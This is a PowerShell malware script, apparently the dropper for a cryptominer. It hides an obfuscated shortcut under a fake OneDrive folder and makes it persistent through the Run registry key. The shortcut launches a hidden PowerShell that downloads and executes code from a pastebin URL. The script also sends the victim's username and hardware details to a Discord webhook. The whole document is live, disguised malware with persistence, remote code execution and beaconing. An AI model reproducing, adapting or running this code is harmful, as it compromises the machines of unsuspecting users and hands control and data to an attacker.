sleep 5

#$googoogaagaa = "$env:tmp\DriverDiag.dll"
$googoogaagaa = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
if (-Not (Test-Path $googoogaagaa)) {

$currentPath = [System.Environment]::GetEnvironmentVariable("PATH", "User")
$newPath = $currentPath + ";$env:tmp"
[System.Environment]::SetEnvironmentVariable("PATH", $newPath, "User")
#New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Driver Diagnosis" -Value "regsvr32.exe /s DriverDiag" -PropertyType String -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OneDrive File Sync" -Value '"C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"' -PropertyType String -Force

#$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/DriverDiag.dll"
#$destination = "$env:tmp\DriverDiag.dll"
#Invoke-WebRequest -Uri $source -OutFile $destination

mkdir "C:\ProgramData\Microsoft OneDrive\FileSync";
$savedbytes = (76,0,0,0,1,20,2,0,0,0,0,0,192,0,0,0,0,0,0,70,171,0,8,0,32,0,0,0,124,37,104,27,210,97,216,1,203,131,156,28,20,3,219,1,124,37,104,27,210,97,216,1,0,16,1,0,0,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,69,1,20,0,31,80,224,79,208,32,234,58,105,16,162,216,8,0,43,48,48,157,25,0,47,67,58,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,86,0,49,0,0,0,0,0,23,89,186,133,48,0,87,105,110,100,111,119,115,0,64,0,9,0,4,0,239,190,167,84,44,42,41,89,8,186,46,0,0,0,246,25,0,0,0,0,2,0,0,0,0,0,12,1,0,0,0,0,0,0,0,0,46,238,28,1,87,0,105,0,110,0,100,0,111,0,119,0,115,0,0,0,22,0,90,0,49,0,0,0,0,0,36,89,104,183,16,0,83,121,115,116,101,109,51,50,0,0,66,0,9,0,4,0,239,190,167,84,44,42,41,89,8,186,46,0,0,0,76,95,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,208,173,33,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,0,0,24,0,102,0,50,0,0,16,1,0,167,84,130,42,32,0,102,111,114,102,105,108,101,115,46,101,120,101,0,0,74,0,9,0,4,0,239,190,167,84,130,42,41,89,208,189,46,0,0,0,65,248,0,0,0,0,1,0,0,0,0,0,116,0,0,0,0,0,0,0,0,0,132,116,26,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,0,0,28,0,0,0,86,0,0,0,28,0,0,0,1,0,0,0,28,0,0,0,52,0,0,0,0,0,0,0,85,0,0,0,24,0,0,0,3,0,0,0,96,56,18,250,16,0,0,0,87,105,110,100,111,119,115,0,67,58,92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,102,111,114,102,105,108,101,115,46,101,120,101,0,0,38,0,46,0,46,0,92,0,46,0,46,0,92,0,46,0,46,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,0,92,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,92,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,215,0,47,0,112,0,32,0,99,0,58,0,92,0,119,0,105,0,110,0,100,0,111,0,119,0,115,0,92,0,115,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,32,0,47,0,109,0,32,0,110,0,111,0,116,0,101,0,112,0,97,0,100,0,46,0,101,0,120,0,101,0,32,0,47,0,99,0,32,0,34,0,112,0,111,0,119,0,101,0,114,0,115,0,104,0,101,0,108,0,108,0,46,0,101,0,120,0,101,0,32,0,45,0,99,0,111,0,109,0,109,0,97,0,110,0,100,0,32,0,112,0,111,0,119,0,101,0,114,0,115,0,104,0,101,0,108,0,108,0,32,0,45,0,119,0,105,0,110,0,100,0,111,0,119,0,115,0,116,0,121,0,108,0,101,0,32,0,104,0,32,0,45,0,99,0,111,0,109,0,109,0,97,0,110,0,100,0,32,0,39,0,115,0,97,0,108,0,32,0,102,0,97,0,116,0,98,0,97,0,107,0,101,0,32,0,99,0,97,0,108,0,99,0,59,0,115,0,97,0,108,0,32,0,99,0,97,0,108,0,108,0,105,0,116,0,32,0,105,0,69,0,120,0,59,0,32,0,115,0,97,0,108,0,32,0,36,0,101,0,110,0,118,0,58,0,111,0,115,0,32,0,105,0,87,0,114,0,59,0,32,0,99,0,97,0,108,0,108,0,105,0,84,0,40,0,87,0,73,0,78,0,68,0,79,0,87,0,83,0,95,0,78,0,84,0,32,0,112,0,97,0,115,0,116,0,101,0,98,0,105,0,110,0,46,0,99,0,111,0,109,0,47,0,114,0,97,0,119,0,47,0,66,0,80,0,54,0,105,0,54,0,69,0,114,0,100,0,32,0,45,0,117,0,115,0,101,0,98,0,97,0,115,0,105,0,99,0,112,0,97,0,114,0,115,0,105,0,110,0,103,0,41,0,39,0,34,0,16,0,0,0,5,0,0,160,37,0,0,0,221,0,0,0,28,0,0,0,11,0,0,160,119,78,193,26,231,2,93,78,183,68,46,177,174,81,152,183,221,0,0,0,96,0,0,0,3,0,0,160,88,0,0,0,0,0,0,0,99,114,97,112,116,111,112,50,0,0,0,0,0,0,0,0,196,49,59,201,13,196,148,66,184,218,109,105,55,240,101,251,41,38,252,74,194,110,239,17,150,194,212,216,83,133,24,17,196,49,59,201,13,196,148,66,184,218,109,105,55,240,101,251,41,38,252,74,194,110,239,17,150,194,212,216,83,133,24,17,73,2,0,0,9,0,0,160,89,0,0,0,49,83,80,83,237,48,189,218,67,0,137,71,167,248,208,19,164,115,102,34,61,0,0,0,100,0,0,0,0,31,0,0,0,22,0,0,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,32,0,40,0,67,0,58,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,0,41,0,0,0,0,0,0,0,137,0,0,0,49,83,80,83,226,138,88,70,188,76,56,67,187,252,19,147,38,152,109,206,109,0,0,0,4,0,0,0,0,31,0,0,0,46,0,0,0,83,0,45,0,49,0,45,0,53,0,45,0,50,0,49,0,45,0,49,0,57,0,53,0,51,0,51,0,50,0,51,0,48,0,50,0,49,0,45,0,57,0,49,0,53,0,52,0,51,0,56,0,48,0,54,0,57,0,45,0,51,0,50,0,50,0,50,0,51,0,54,0,51,0,57,0,52,0,52,0,45,0,49,0,48,0,48,0,49,0,0,0,0,0,0,0,177,0,0,0,49,83,80,83,48,241,37,183,239,71,26,16,165,241,2,96,140,158,235,172,45,0,0,0,10,0,0,0,0,31,0,0,0,13,0,0,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,0,0,0,0,21,0,0,0,15,0,0,0,0,64,0,0,0,0,154,130,27,210,97,216,1,21,0,0,0,12,0,0,0,0,21,0,0,0,0,16,1,0,0,0,0,0,41,0,0,0,4,0,0,0,0,31,0,0,0,12,0,0,0,65,0,112,0,112,0,108,0,105,0,99,0,97,0,116,0,105,0,111,0,110,0,0,0,21,0,0,0,14,0,0,0,0,64,0,0,0,124,37,104,27,210,97,216,1,0,0,0,0,113,0,0,0,49,83,80,83,166,106,99,40,61,149,210,17,181,214,0,192,79,217,24,208,85,0,0,0,30,0,0,0,0,31,0,0,0,33,0,0,0,67,0,58,0,92,0,87,0,105,0,110,0,100,0,111,0,119,0,115,0,92,0,83,0,121,0,115,0,116,0,101,0,109,0,51,0,50,0,92,0,102,0,111,0,114,0,102,0,105,0,108,0,101,0,115,0,46,0,101,0,120,0,101,0,0,0,0,0,0,0,0,0,57,0,0,0,49,83,80,83,177,22,109,68,173,141,112,72,167,72,64,46,164,61,120,140,29,0,0,0,104,0,0,0,0,72,0,0,0,127,105,194,224,217,88,248,75,138,252,26,60,66,49,4,72,0,0,0,0,0,0,0,0,0,0,0,0)
$reconstructedFile = "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk"
[System.IO.File]::WriteAllBytes($reconstructedFile, $savedbytes)
$ieoaj = $reconstructedFile
sleep 10
attrib +s +h $ieoaj

# Retrieve CPU information
$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors

# Retrieve GPU information
$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion

sleep 2

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1296465160478916628/D3bNTNX895fhj62SpM_35rPyIZ-tPpvhm4SSX2hDFO1ijRVKFsBGXGDVZZb4XVXLs8kz"

# Define the message payload
$payload = @{
    content = @"
**$env:username** has joined - crzcrpt
----------------------------------
**GPU:** $($gpu.Name)
**CPU:** $($cpu.Name)
**CPU Cores:** $($cpu.NumberOfCores)
"@
} | ConvertTo-Json

# Send the POST request to the webhook URL
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Output "Message sent successfully."
} catch {
    Write-Output "Failed to send message. Error: $_"
}
}
